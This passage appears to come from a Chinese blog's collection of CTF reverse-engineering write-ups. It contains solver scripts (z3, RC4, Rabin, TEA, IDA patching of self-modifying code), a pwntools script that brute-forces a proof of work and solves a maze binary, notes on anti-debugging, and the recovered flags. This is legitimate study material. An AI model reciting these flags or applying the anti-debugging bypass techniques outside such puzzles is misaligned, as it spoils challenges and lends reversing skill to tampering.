flag[7]- 186932 * flag[9]+ 87264470s.add(v10==0)v11 = -87190 * flag[2]- 74836 * flag[1]+ 16892 * flag[9]- 185781 * flag[8]- 12726 * flag[7]+ 85022 * flag[12]+ 232989 * flag[10]+ 68516 * flag[0]- 120254 * flag[6]- 204892 * flag[5]- 65901 * flag[4]- 201087 * flag[13]+ 158612 * flag[11]- 49445 * flag[3]- 181860 * flag[14]- 111015 * flag[15]+ 43646834s.add(v11==0)v12 = -170184 * flag[3] - 137671 * flag[4] - 85374 * flag[9] - 73658 * flag[11] + 230891 * flag[13] + 54346 * flag[15] - 280694 * flag[0] + 60411 * flag[2] + 27171 * flag[7] - 50618 * flag[6] + 11843 * flag[10] + 131778 * flag[5] + 13956 * flag[8] - 42562 * flag[12] - 19972 * flag[1] - 145797 * flag[14] - 58717 * flag[16] + 74613584s.add(v12==0)v13 = 242475 * flag[16]- 234385 * flag[0]+ 124653 * flag[2]- 287929 * flag[13]- 190916 * flag[12]- 277578 * flag[11]+ 39 * flag[8]- 41625 * flag[6]+ 67262 * flag[5]- 250144 * flag[9]- 70886 * flag[10]- 223492 * flag[15]- 179651 * flag[7]+ 206538 * flag[17]+ 161965 * flag[3]- 146258 * flag[4]+ 167068 * flag[1]+ 196330 * flag[14]+ 76353817s.add(v13==0)v14 = 29700 * flag[18]- 60542 * flag[5]+ 274107 * flag[11]+ 154914 * flag[13]- 143185 * flag[12]+ 167424 * flag[2]+ 137439 * flag[8]- 186151 * flag[10]- 77157 * flag[9]- 233090 * flag[6]- 27400 * flag[7]- 76557 * flag[15]- 108002 * flag[17]+ 103161 * flag[14]- 133956 * flag[1]- 219502 * flag[4]- 202897 * flag[0]- 250957 * flag[3]- 119297 * flag[16]+ 100812197s.add(v14==0)v15 = -171971 * flag[9]+ 38740 * flag[4]+ -31661 * flag[10]+ -194653 * flag[18]+ -295910 * flag[16]+ 136489 * flag[12]+ 212619 * flag[17]+ 165592 * flag[11]+ 211791 * flag[1]+ 156909 * flag[2]+ -232187 * flag[8]+ -73709 * flag[7]+ 79735 * flag[14]+ 184882 * flag[13]+ 111105 * flag[6]+ 148840 * flag[3]+ -35774 * flag[19]+ -275711 * flag[0] + 135265 * flag[5] - 141221 * flag[15] - 39117122s.add(v15==0)v16 = -186514 * flag[17]+ -7791 * flag[2]+ 276755 * flag[11]+ -294815 * flag[14]+ -238763 * flag[15]+ -146099 * flag[5]+ 184977 * flag[16]+ 178413 * flag[1]+ 287303 * flag[3]+ -71946 * flag[10]+ -73771 * flag[9]+ -129032 * flag[18]+ 200202 * flag[20]+ -150509 * flag[6]+ -156625 * flag[13]+ 14093 * flag[7]+ 192584 * flag[12]- 122770 * flag[0]- 255494 * flag[8] + 65 * flag[4] - 108479 * flag[19] + 13521895s.add(v16==0)v17 = 210978 * flag[7]+ 300336 * flag[10]+ 207254 * flag[15]+ 216206 * flag[5]+ -63529 * flag[0]+ -274903 * flag[11]+ -10750 * flag[14]+ 25008 * flag[4]+ -100942 * flag[19]+ -104857 * flag[2]+ 266501 * flag[8]+ 229070 * flag[17]+ -234559 * flag[16]+ 298459 * flag[3]+ -172052 * flag[6]+ -98938 * flag[12]+ 66155 * flag[13]+ -84761 * flag[1]+ -283508 * flag[18]+ 288577 * flag[21] - 75407 * flag[20] - 204447 * flag[9] + 4351595s.add(v17==0)v18 = -201846 * flag[14]+ 272550 * flag[20]+ 60398 * flag[6]+ 45580 * flag[7]+ 195108 * flag[11]+ 38596 * flag[0]+ 220445 * flag[18]+ -190873 * flag[15]+ 103477 * flag[9]+ 118842 * flag[19]+ 206336 * flag[10]+ -249940 * flag[17]+ -48084 * flag[21]+ 104901 * flag[5]+ -48576 * flag[4]+ 287104 * flag[16]+ -286686 * flag[1]+ -30253 * flag[22]+ 121183 * flag[3]+ 90967 * flag[2]+ -195519 * flag[12] - 129304 * flag[8] + 141188 * flag[13] - 56642147s.add(v18==0)v19 = 110609 * flag[4]+ 5913 * flag[21]+ -197578 * flag[7]+ 45127 * flag[18]+ 282426 * flag[13]+ -71019 * flag[16]+ -6980 * flag[11]+ 208216 * flag[15]+ -13544 * flag[20]+ 17852 * flag[8]+ 167833 * flag[12]+ 145568 * flag[17]+ 3610 * flag[19]+ 91985 * flag[1]+ -267402 * flag[5]+ -32355 * flag[14]+ -197823 * flag[23]+ 135525 * flag[2]+ -229424 * flag[22]+ 38093 * flag[10]+ 50167 * flag[6]+ 118713 * flag[9] + 123874 * flag[0] - 89499 * flag[3] - 43090537s.add(v19==0)v1 = -164755 * flag[9] + 175470 * flag[8] - 28660 * flag[1] + 7217 * flag[11] - 295102 * flag[4] - 28531 * flag[19] - 106265 * flag[25] - 92750 * flag[10] + 16738 * flag[21] - 231714 * flag[6] + 172042 * flag[24] - 215890 * flag[17] + 199697 * flag[12] - 84235 * flag[7] + 44614 * flag[13] + 75104 * flag[5] - 195843 * flag[0] - 15784 * flag[14] - 131950 * flag[15] - 268167 * flag[16] - 197565 * flag[20] + 24340 * flag[23] + 105130 * flag[2] - 79750 * flag[22] - 264668 * flag[3] + 50329 * flag[18] + 137774797s.add(v1==0)v20 = 62119 * flag[17]- 17215 * flag[24]+ 289621 * flag[18]+ 53006 * flag[20]+ 95969 * flag[11]+ 202404 * flag[0]+ 247060 * flag[21]+ 144211 * flag[19]+ 280106 * flag[7]- 126431 * flag[10]- 226837 * flag[12]+ 10463 * flag[23]+ 121257 * flag[13]- 84190 * flag[9]+ 88917 * flag[1]+ 15453 * flag[14]+ 271442 * flag[4]+ 110851 * flag[3]- 231422 * flag[5]+ 176741 * flag[22]+ 266134 * flag[2]- 197327 * flag[6]- 55225 * flag[8] - 265465 * flag[15] + 119612 * flag[16] - 98514358s.add(v20==0)v2 = 151924 * flag[25] - 265311 * flag[6] + 107604 * flag[11] - 47851 * flag[24] + 227178 * flag[13] - 162699 * flag[2] + 2171 * flag[20] + 211070 * flag[23] + 94815 * flag[22] + 124760 * flag[16] + 41462 * flag[19] - 277022 * flag[15] - 62501 * flag[26] - 17727 * flag[14] - 257908 * flag[4] - 175112 * flag[21] + 8972 * flag[10] - 71801 * flag[8] - 114724 * flag[5] - 252898 * flag[9] + 161457 * flag[1] - 64461 * flag[0] - 111493 * flag[18] + 200145 * flag[17] - 290075 * flag[3] + 158466 * flag[12]v21 = v2 - 275262 * flag[7] + 86899519s.add(v21==0)v3 = 142850 * flag[18]- 166704 * flag[1]+ 284852 * flag[22]+ 248972 * flag[7]- 76200 * flag[17]+ 261708 * flag[19]+ 91911 * flag[24]+ 22347 * flag[3]+ 76006 * flag[21]+ 256511 * flag[6]- 100052 * flag[14]- 115830 * flag[2]- 93202 * flag[23]+ 248858 * flag[12]- 262669 * flag[10]+ 67895 * flag[5]- 111771 * flag[8]- 132193 * flag[11]- 141512 * flag[13]+ 139406 * flag[27]+ 109646 * flag[16]- 286309 * flag[9]+ 175476 * flag[15] + 138067 * flag[20] + 192825 * flag[25]s.add(flag[0] == 102)s.add(flag[1] == 108)s.add(flag[2] == 97)s.add(flag[3] == 103)s.add(flag[4] == 123)s.add(flag[27] == 125)s.add(199577 * flag[0] - 63091 * flag[4] + v3 - 285207 * flag[26] - 58820340 + v21 == 0)print(s.check())print(s.model())mod = s.model()print(&#x27;&#x27;.join([chr(mod[x].as_long()) for x in flag])) easyre首先来卡一下main函数 finger识别一下函数 fork函数在主进程返回的是子进程的PID，在子进程返回的是0，这里生成一个re3的文件 ptrace函数深入分析 - 黑箱 - 博客园 (cnblogs.com) 这里的ptrace比较重要代表不同的类型 光标在第一个参数上按M，搜索 ptrace，就可以得到相应的参数。 进入401f2f函数 4017e5函数，有一大串数据 似乎是对子进程进行了一些操作，我们去看看之前的re3文件 Int setjmp(jmp_buf env); ​ 返回值：若直接调用则返回0，若从longjmp调用返回则返回非0值的longjmp中的val值 Void longjmp(jmp_buf env,int val); ​ 调用此函数则返回到语句setjmp所在的地方，其中env 就是setjmp中的 env，而val 则是使setjmp的返回值变为val。 这里的loc_21F9是重要逻辑，跟进，看到一个int3，这里发出中断信号，等待主处理进程，然后主进程判断异常类型（这就是后面的值），然后执行smc操作，也照应了之前的wait函数。 下面我们再回到主进程分析一下smc 带参数启动调试。 主要smc逻辑 我们运用断点把数据提取出来 12345678910xorKey = &#123;8723: 2533025110152939745, 8739: 5590097037203163468, 8755: 17414346542877855401, 8771: 17520503086133755340, 8787: 12492599841064285544, 8803: 12384833368350302160, 8819: 11956541642520230699, 8835: 12628929057681570616, 8851: 910654967627959011, 8867: 5684234031469876551, 8883: 6000358478182005051, 8899: 3341586462889168127, 8915: 11094889238442167020, 8931: 17237527861538956365, 8947: 17178915143649401084, 8963: 11176844209899222046, 8979: 18079493192679046363, 8995: 7090159446630928781, 9011: 863094436381699168, 9027: 6906972144372600884, 9043: 16780793948225765908, 9059: 7086655467811962655, 9075: 13977154540038163446, 9091: 7066662532691991888, 9107: 15157921356638311270, 9123: 12585839823593393444, 9139: 1360651393631625694, 9155: 2139328426318955142, 9171: 2478274715212481947, 9187: 12876028885252459748, 9203: 18132176846268847269, 9219: 17242441603067001509, 9235: 8492111998925944081, 9251: 14679986489201789069, 9267: 13188777131396593592, 9283: 5298970373130621883, 9299: 525902164359904478, 9315: 2117701741234018776, 9331: 9158760851580517972&#125;addr = 0x2213while True: data = get_qword(addr) key = xorKey[addr] dec = data ^ key idc.patch_qword(addr, dec) addr += 16 之后跑脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384_BYTE *__fastcall sub_21F9(__int64 a1, __int64 a2, __int64 a3)&#123; _BYTE *result; // rax int v4; // [rsp+20h] [rbp-28h] int v5; // [rsp+24h] [rbp-24h] char v6; // [rsp+28h] [rbp-20h] int v7; // [rsp+2Ch] [rbp-1Ch] int j; // [rsp+30h] [rbp-18h] int v9; // [rsp+34h] [rbp-14h] int v10; // [rsp+38h] [rbp-10h] char v11; // [rsp+3Ch] [rbp-Ch] int v12; // [rsp+40h] [rbp-8h] int i; // [rsp+44h] [rbp-4h] __debugbreak(); for ( i = 0; i &lt;= 24; ++i ) &#123; v12 = 0; v11 = 0; v10 = 0; v9 = 1; while ( v12 &lt;= 24 ) &#123; if ( *(_BYTE *)(25 * i + v12 + a1) ) &#123; ++v11; v10 = 1; &#125; else &#123; if ( v10 ) &#123; *(_BYTE *)(a2 + 25LL * i + v9) = v11; v11 = 0; ++v9; &#125; v10 = 0; &#125; if ( ++v12 == 25 &amp;&amp; v10 ) &#123; *(_BYTE *)(a2 + 25LL * i + v9) = v11; v11 = 0; ++v9; &#125; &#125; result = (_BYTE *)(25LL * i + a2); *result = v9 - 1; &#125; for ( j = 0; j &lt;= 24; ++j ) &#123; v7 = 0; v6 = 0; v5 = 0; v4 = 1; while ( v7 &lt;= 24 ) &#123; if ( *(_BYTE *)(25 * v7 + j + a1) ) &#123; ++v6; v5 = 1; &#125; else &#123; if ( v5 ) &#123; *(_BYTE *)(a3 + 25LL * j + v4) = v6; v6 = 0; ++v4; &#125; v5 = 0; &#125; if ( ++v7 == 25 &amp;&amp; v5 ) &#123; *(_BYTE *)(a3 + 25LL * j + v4) = v6; v6 = 0; ++v4; &#125; &#125; result = (_BYTE *)(25LL * j + a3); *result = v4 - 1; &#125; __debugbreak(); return result;&#125; 是一个数织游戏 于是很明显我们RE3的主函数的对比数据不对，于是这时候就去init段还有个preinit段找 同样的手法是通过偏移来进行了混淆，手动计算即可，最后拿到真实数据 然后用网站解密 Nonogram (handsomeone.github.io) 还有一种动态调试： 强网杯2022-Reverse-easyre wp","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[{"name":"linux反调试","slug":"linux反调试","permalink":"http://example.com/tags/linux%E5%8F%8D%E8%B0%83%E8%AF%95/"}],"keywords":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}]},{"title":"搜索与图论","slug":"搜索与图论","date":"2022-07-25T16:00:00.000Z","updated":"2022-07-26T07:49:56.038Z","comments":true,"path":"2022/07/26/搜索与图论/","link":"","permalink":"http://example.com/2022/07/26/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA/","excerpt":"","text":"树与图的存储树是一种特殊的图，与图的存储方式相同。对于无向图中的边ab，存储两条有向边a-&gt;b, b-&gt;a。因此我们可以只考虑有向图的存储。 (1) 邻接矩阵：g[a][b] 存储边a-&gt;b (2) 邻接表： 123456789101112// 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点int h[N], e[N], ne[N], idx;// 添加一条边a-&gt;bvoid add(int a, int b)&#123; e[idx] = b, ne[idx] = h[a], h[a] = idx ++ ;&#125;// 初始化idx = 0;memset(h, -1, sizeof h); DFS12345678910int dfs(int u)&#123; st[u] = true; // st[u] 表示点u已经被遍历过 for (int i = h[u]; i != -1; i = ne[i]) &#123; int j = e[i]; if (!st[j]) dfs(j); &#125;&#125; BFS12345678910111213141516171819queue&lt;int&gt; q;st[1] = true; // 表示1号点已经被遍历过q.push(1);while (q.size())&#123; int t = q.front(); q.pop(); for (int i = h[t]; i != -1; i = ne[i]) &#123; int j = e[i]; if (!st[j]) &#123; st[j] = true; // 表示点j已经被遍历过 q.push(j); &#125; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"DAS七月赛","slug":"DAS七月赛","date":"2022-07-25T06:23:13.740Z","updated":"2022-07-25T12:13:57.502Z","comments":true,"path":"2022/07/25/DAS七月赛/","link":"","permalink":"http://example.com/2022/07/25/DAS%E4%B8%83%E6%9C%88%E8%B5%9B/","excerpt":"","text":"隐秘的角落加密后的数据在init函数有异或0x23的操作，是rc4加密 12345678910111213141516171819202122232425262728293031323334import base64def rc4_main(key, message): s_box = rc4_init_sbox(key) crypt = rc4_excrypt(message, s_box) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_boxdef rc4_excrypt(plain, box): res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(s ^ k)) for i in range (len(res)): print(res[i],end=&#x27;&#x27;) return res#a=[0xE0,0xB2,0x5F,0x3D,0x8F,0xFA,0x94,0xB6,0xE7,0x9D,0x6C,0x98,0x66,0xD2,0x0F,0xEA,0x6D,0x6F,0xBE,0xC5,0x71,0x40,0x08,0x1B,0xF6,0xF3,0xBD,0xA8,0x8D,0x09,0x7B,0x7C]a = [251, 198, 166, 157, 196, 219, 123, 86, 182, 70, 166, 192, 133, 100, 122, 154, 55, 76, 16, 150, 233, 167, 40, 196, 177, 45, 241, 222, 71, 59, 181, 243, 44, 125, 103, 29]rc4_main(&quot;thisiskkk&quot;,a) 得到56e83694-f976-11eb-b343-faffc201c8e0 再md5加密小写就是flag ezGogo题一些陌生的函数以及奇怪的变量配合动调体验更加 这里的循环的作用主要是把输入的40个字符的ASCII码拼接成一个大整数 然后就是平方取余比较 加密就是如下$$c&#x3D;m^2modn$$一种特殊的RSA加密形式，用rabnin算法解 用yafu分解大质数，可以发现这两个质数都是模四余三，根据e&#x3D;2可知，这是一个rabin算法。 12345678910111213141516171819202122import libnumimport gmpy2#导入公钥n=131453094564548508772284336424680998857035326273571981446094083416917514535349876760437096547435610190391556347148927592380050533193934285571983556924577144473815598516557161e = 2c=33529281532734294938614341047870321616766628114182320093600990983456360122704185955921012051918080449587733939007294096845300395098833835443815283246602601870001850089370636#n 在线分解p=17489158711316178659q=7516261744453902635364442762653073356746063224482072262455102025715350278471780391042196223686233375846890331396948280463168691132631674699134296333350979inv_p = gmpy2.invert(p, q)inv_q = gmpy2.invert(q, p)mp = pow(c, (p + 1) // 4, p)mq = pow(c, (q + 1) // 4, q)a = (inv_p * p * mq + inv_q * q * mp) % nb = n - int(a)c = (inv_p * p * mq - inv_q * q * mp) % nd = n - int(c)#因为rabin 加密有四种结果，全部列出。aa=[a,b,c,d]for i in aa: # print(i) print(libnum.n2s(int(i))) 得到flag：DASCTF{48fa8aa2b489e9adac1750ea16ddc7b5} fantansic maze sha256爆破 自动化路径求解 bfs算法 首先是常规的sha256爆破 过了proof之后题目会给出远程程序的base64编码，将编码解码后写入文本再拖入IDA查看 其中有1000个相似的函数，其汇编代码大致如下(这里IDA F5看不出来啥东西) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556.text:0000000000001358 function_0 proc near ; CODE XREF: function_36+85↓p.text:0000000000001358 ; function_201+67↓p ....text:0000000000001358 ; __unwind &#123;.text:0000000000001358 endbr64.text:000000000000135C push rbp.text:000000000000135D mov rbp, rsp.text:0000000000001360 sub rsp, 10h.text:0000000000001364 mov eax, cs:tmp.text:000000000000136A add eax, 1.text:000000000000136D mov cs:tmp, eax.text:0000000000001373 lea rdi, aStep1 ; &quot;step1:&quot;.text:000000000000137A call sub_10C0.text:000000000000137F mov eax, 0.text:0000000000001384 call read_num.text:0000000000001389 mov [rbp-4], eax.text:000000000000138C cmp dword ptr [rbp-4], 0Ah.text:0000000000001390 ja loc_141E.text:0000000000001396 mov eax, [rbp-4].text:0000000000001399 lea rdx, ds:0[rax*4].text:00000000000013A1 lea rax, unk_3501C.text:00000000000013A8 mov eax, [rdx+rax].text:00000000000013AB cdqe.text:00000000000013AD lea rdx, unk_3501C.text:00000000000013B4 add rax, rdx.text:00000000000013B7 db 3Eh.text:00000000000013B7 jmp rax.text:00000000000013BA ; ---------------------------------------------------------------------------.text:00000000000013BA mov eax, 0.text:00000000000013BF call function_541.text:00000000000013C4 mov eax, 0.text:00000000000013C9 call function_205.text:00000000000013CE mov eax, 0.text:00000000000013D3 call function_297.text:00000000000013D8 mov eax, 0.text:00000000000013DD call function_175.text:00000000000013E2 mov eax, 0.text:00000000000013E7 call function_331.text:00000000000013EC mov eax, 0.text:00000000000013F1 call function_287.text:00000000000013F6 mov eax, 0.text:00000000000013FB call function_938.text:0000000000001400 mov eax, 0.text:0000000000001405 call function_413.text:000000000000140A mov eax, 0.text:000000000000140F call function_934.text:0000000000001414 mov eax, 0.text:0000000000001419 call function_1000.text:000000000000141E.text:000000000000141E loc_141E: ; CODE XREF: function_0+38↑j.text:000000000000141E mov eax, 0.text:0000000000001423 call main.text:0000000000001428 nop.text:0000000000001429 leave.text:000000000000142A retn.text:000000000000142A ; &#125; // starts at 1358.text:000000000000142A function_0 endp 转换为伪代码大致如下 123456789tmp++;switch(read_num())&#123; case &quot;1&quot;: function_541(); case &quot;2&quot;: function_205(); ..... case &quot;10&quot; function_1000(); default: main();&#125; 从function_0 ~ function_999都能跳转到其它的十个函数，我们的目标是要在第1000步的时候走到function_1000从而获得flag 但是这里可以发现在每一个switch内只要default就会返回main函数，那么我们其实只需要找到一条长度小于1000的路径，然后一直default去填充tmp就好了 寻找最短路径可以采用bfs算法，那我们只需要知道1000个函数每个函数可以跳转到那些函数就好了，但是由于每一次的maze都是随机生成的且超过20秒就会直接Alarm clock,所以我们不能通过IDA来直观的得知程序的构造，而是需要我们手动分析hex view来得到程序的构造 分析Hex View主要分析的就是call指令 call指令占5个字节,如00000000000013BF call function_541 在 Hex View 中为\\x00\\x01\\xbd\\x7b\\xe8(这里为大端序), \\xe8可以理解为标志位,\\x00\\x01\\xbd\\x7b为地址到跳转函数的00000000000013BF偏移,而这里每一个函数的偏移为0xd3，这里就可以通过偏移来算出call指令所指向的函数 这里得注意下这里得偏移是有符号数，所以在计算的时候需要将其转换 最后，在得到表之后，用bfs算法得到路径，最后得到flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#!/usr/bin/python3from pwn import *import randomimport sysfrom hashlib import sha256p = remote(&quot;127.0.0.1&quot;,1447)def pass_proof(): dir = string.ascii_letters + string.digits #生成24个字母和十个数 p.recvuntil(&#x27;[+] sha256(XXXX+&#x27;) salt = p.recv(16).strip().decode()#strip() 方法用于移除字符串头尾指定的字符（/n) #decode() 方法以 encoding 指定的编码格式解码字符串。默认编码为字符串编码。 p.recvuntil(&#x27;) == &#x27;) hash = p.recv(64).strip().decode() while True: rand_str = (&#x27;&#x27;.join([random.choice(dir) for _ in range(4)])) + salt if sha256(rand_str.encode()).hexdigest() == hash: print(rand_str[:4]) p.sendlineafter(&#x27;[+] Plz Tell Me XXXX :&#x27;, rand_str[:4]) breakdef get_elf(): p.recvuntil(&quot;map :\\n&quot;) data=p.recvuntil(&#x27;That\\&#x27;s all\\n&#x27;,drop=True)[:-1] data=base64.b64decode(data) fd=open(&#x27;pwnpwn&#x27;,&#x27;wb&#x27;) fd.write(data) fd.close()pass_proof()get_elf()fd = open(&quot;./pwnpwn&quot;,&quot;rb&quot;)offset = 0x13C0def get_map(fd,offset): Map = [] for i in range(1000): addr = offset for j in range(10): fd.seek(addr) fc = u64(fd.read(4).ljust(8,b&#x27;\\x00&#x27;)) if fc &lt;= 0x33765: #整个迷宫函数的长度 fc = fc//0xd3 + i + 1 #oxd3是func度 else: fc = fc - 0x100000000 if fc &gt; -0xd3: fc = i else: if addr+fc &lt; 0x134A: #func1000 fc = 1000 else: fc = fc//0xd3 fc = i+1+fc Map.append(fc) addr += 0xa #case的长度 offset += 0xd3 return MapMap = get_map(fd,offset)def do_bfs(Map): values = [] keys = [] for y in range(1000): for x in range(10): if x == 0: values.append([]) values[y].append(Map[x + y * 10]) for i in range(1000): keys.append(i) result = dict(zip(keys,values)) #两个列表合并成一个字典 result[1000] = &quot;&quot; #print(result) result1 = None q = [(0,&#x27;&#x27;)] check_map = &#123;&#125; while len(q): f = q[0] q = q[1:] if f[0] == 1000: result1 = f[1] break if f[0] not in check_map: check_map[f[0]] = f[1] for i in range(10): if result[f[0]][i] not in check_map: q.append((result[f[0]][i],f[1]+str(i))) return result1result = do_bfs(Map)print(result)result = str(result)times = 999 - len(result)for i in range(times): p.sendline(&quot;11&quot;)for i in range(len(result)): p.sendline(str(int(result[i])+1))","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-DAS","slug":"DAS","permalink":"http://example.com/tags/DAS/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"FFunction","slug":"FFunction","date":"2022-07-18T13:47:05.000Z","updated":"2022-07-18T15:25:52.318Z","comments":true,"path":"2022/07/18/FFunction/","link":"","permalink":"http://example.com/2022/07/18/FFunction/","excerpt":"","text":"ida打开my_plugin.dll 在my_plugin.dll的f函数断下，f函数先将第⼀个参数的数值分成2个word，然后tea加密并与第⼆个参数的值⽐较。 第⼀个参数的值是输⼊经过位置变换然后base64 第二个参数 12[+] Dump 0x1ECA101B060 - 0x1ECA101B0B0 (80 bytes) :[0x5C15754C, 0xD1D781E7, 0x501BF173, 0xCB4DB222, 0x215D61F5, 0x3FCA9EE7, 0x7C76B5C7, 0xC7DD8CB9, 0x990D23FA, 0x0BAB1AD3, 0x8E12C932, 0xD307BAF2, 0xE52DD123, 0xFBB68F2C, 0xBDD853E3, 0x892E1E4E, 0x39DD66FA, 0x87FEEC65, 0x307C5E60, 0x340C6C00] tea解密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;windows.h&gt;void Decrypt(UINT32 *v, UINT32 *k)&#123; unsigned long n = 32, sum, y = v[0], z = v[1]; unsigned long delta = 0x79B99E37; sum = delta &lt;&lt; 5; while (n-- &gt; 0) &#123; z += ((y &lt;&lt; 4) + k[2]) ^ (y + sum) ^ ((y &gt;&gt; 5) + k[3]); y += ((z &lt;&lt; 4) + k[0]) ^ (z + sum) ^ ((z &gt;&gt; 5) + k[1]); sum -= delta; &#125; v[0] = y; v[1] = z;&#125;int main()&#123; UINT32 key[4] = &#123;0x0BABEC0FE, 0x0DEADBEEF, 0x0FACEB00C, 0xDEADC0DE&#125;; UINT32 enc[21] = &#123;1544910156, 3520561639, 1344008563, 3410866722, 559768053, 1070243559, 2088154567, 3353185465, 2567775226, 195762899, 2383595826, 3540499186, 3844985123, 4223045420, 3185071075, 2301501006, 970811130, 2281630821, 813456992, 873229312, 0&#125;; Decrypt(enc, key); Decrypt(enc + 2, key); Decrypt(enc + 4, key); Decrypt(enc + 6, key); Decrypt(enc + 8, key); Decrypt(enc + 10, key); Decrypt(enc + 12, key); Decrypt(enc + 14, key); Decrypt(enc + 16, key); Decrypt(enc + 18, key); Decrypt(enc + 20, key); for (int i = 0; i &lt; 20 * 4; i++) &#123; printf(&quot;%02x&quot;, ((char *)enc)[i]); &#125; &#125; 再经过base64解码 1234567891011import base64a=&quot;30014006400460044007500230035008600c400a600e6003600c300930016004300340025004400d7007500250086002600f5006300050083007400e3000500a600840055007400970033001600e500a&quot;import reccc=re.findall(&quot;.&#123;2&#125;&quot;,a)ccc=[int(i,16) for i in ccc]fl=&quot;&quot;for index in range(0,len(ccc),2): fl+=(chr(ccc[index]+ccc[index+1]))print(fl[::-1])print(base64.b64decode(fl[::-1]).decode()) 还原 12345678910flag=&quot;f&#125;l!a!gC&#123;_Ehmtp10ww_erre_tFt1u&quot;print(len(flag))f1=&quot;&quot;f2=&quot;&quot;for index in range(len(flag)): if index%2==0: f1+=flag[index] else: f2+=flag[index]print(f1+f2) 1flag&#123;Emp0wer_F1&#125;!!C_ht1w_rettu 再把后部分逆序 1flag&#123;Emp0wer_F1utter_w1th_C!!&#125; 参考dsctf2022 wp - FW_ltlly - 博客园 (cnblogs.com)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[dll]","slug":"dll","permalink":"http://example.com/tags/dll/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"catchme","slug":"catchme","date":"2022-07-18T04:17:01.000Z","updated":"2022-07-18T04:42:01.542Z","comments":true,"path":"2022/07/18/catchme/","link":"","permalink":"http://example.com/2022/07/18/catchme/","excerpt":"","text":"主要check函数在native层里面 ida打开so文件,findcrypto找到aes加密，定位到主要加密函数 sub_B2A4 先是一个aes然后是base64 很多的反调试，但是可以直接静态解，aes的key和最后的比较函数都经过异或加密 加密函数datadiv_decode2726420793510661260() 123456789a=[0x4F, 0x1C, 0x36, 0x49, 0x09, 0x3A, 0x3F, 0x07, 0x4D, 0x3D, 0x22, 0x39, 0x00, 0x0A, 0x22, 0x25, 0x06, 0x09, 0x01, 0x20, 0x4A, 0x1B, 0x51, 0x51, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]for i in range(len(a)): a[i]^=0x6C print(chr(a[i]),end=&#x27;&#x27;)print(&#x27; &#x27;)b=[0x24, 0x3C, 0x3D, 0x37, 0x36, 0x21, 0x35, 0x26, 0x3F, 0x37, 0x32, 0x2A, 0x72, 0x72, 0x72, 0x72, 0x53, 0x00]for i in range(len(b)): b[i]^=0x53 print(chr(b[i]),end=&#x27;&#x27;) 比较的字符串：#pZ%eVSk!QNUlfNIjemL&amp;w&#x3D;&#x3D; aes的密钥：wonderfulday!!!! 解密得到flag flag{weu&#x2F;.,iopl}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[native] -[android]","slug":"native-android","permalink":"http://example.com/tags/native-android/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"LOADER","slug":"LOADER","date":"2022-07-14T01:21:57.000Z","updated":"2022-07-14T08:33:05.545Z","comments":true,"path":"2022/07/14/LOADER/","link":"","permalink":"http://example.com/2022/07/14/LOADER/","excerpt":"","text":"64位无壳 123456BOOL VirtualProtect( LPVOID lpAddress, // 目标地址起始位置 DWORD dwSize, // 大小 DWORD flNewProtect, // 请求的保护方式 PDWORD lpflOldProtect // 保存老的保护方式); VirtualProtectEx函数可以改变在特定进程中内存区域的保护属性。 独立了一个新的虚拟内存，权限可读可写可执行，作为后面新程序的一个引导，根据后面给的内存地址，将被引导的程序dump下来 无法正常运行，文件头存在问题。（主程序是64位但是文件头 这里修改文件头和可选头的值 主要逻辑为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214int sub_BF2850()&#123; FILE *v0; // rax __int64 v1; // rax _QWORD *v2; // rsi __int64 v3; // rdi __int64 v4; // rdx __int64 v5; // rbx __m128i *v6; // rax __m128i *v7; // rdi __m128i *v8; // rax unsigned __int64 *v10; // rsi __int64 v11; // rbx __int64 v12; // rcx __m128i *input_1; // rbp __int64 v14; // rdx unsigned __int64 v15; // rdi __int64 v16; // rbx unsigned __int64 *len; // rbp __m128i *v18; // rax __int64 v19; // rcx __m128i *input_2; // rdi __int64 v21; // rdx unsigned __int64 v22; // rsi __int64 v23; // rdi __int64 v24; // rdx unsigned __int64 v25; // rcx __m128i v26; // xmm4 __int64 v27; // rdi __int64 v28; // rdx unsigned __int64 v29; // rcx __m128i v30; // [rsp+20h] [rbp-78h] BYREF __m128i v31; // [rsp+30h] [rbp-68h] BYREF __int64 v32; // [rsp+40h] [rbp-58h] BYREF __int64 v33; // [rsp+48h] [rbp-50h] __m128i v34; // [rsp+50h] [rbp-48h] BYREF __int64 v35; // [rsp+60h] 